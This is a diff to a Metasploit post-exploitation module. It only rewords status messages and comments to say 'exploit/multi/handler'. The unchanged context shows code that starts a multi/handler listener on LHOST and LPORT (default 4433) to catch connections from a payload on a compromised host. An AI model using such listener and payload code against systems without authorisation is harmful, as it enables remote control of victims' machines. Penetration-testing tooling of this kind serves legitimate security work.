@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Post
         OptInt.new('LPORT',
           [false, 'Port for Payload to connect to.', 4433]),
         OptBool.new('HANDLER',
-          [ true, 'Start an Exploit Multi Handler to receive the connection', true])
+          [ true, 'Start an exploit/multi/handler to receive the connection', true])
       ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Post
     if datastore['HANDLER']
       listener_job_id = create_multihandler(lhost, lport, payload_name)
       if listener_job_id.blank?
-        print_error("Failed to start multi/handler on #{datastore['LPORT']}, it may be in use by another process.")
+        print_error("Failed to start exploit/multi/handler on #{datastore['LPORT']}, it may be in use by another process.")
         return nil
       end
     end
@@ -208,7 +208,7 @@ class Metasploit3 < Msf::Post
           timer += 1
         end
       end
-      print_status('Stopping multi/handler')
+      print_status('Stopping exploit/multi/handler')
       framework.jobs.stop_job(listener_job_id)
     }
   end
@@ -238,12 +238,12 @@ class Metasploit3 < Msf::Post
     return false
   end
 
-  # Starts a multi/handler session
+  # Starts a exploit/multi/handler session
   def create_multihandler(lhost, lport, payload_name)
     pay = client.framework.payloads.create(payload_name)
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
-    print_status('Starting exploit multi handler')
+    print_status('Starting exploit/multi/handler')
     if !check_for_listener(lhost, lport)
       # Set options for module
       mh = client.framework.exploits.create('multi/handler')
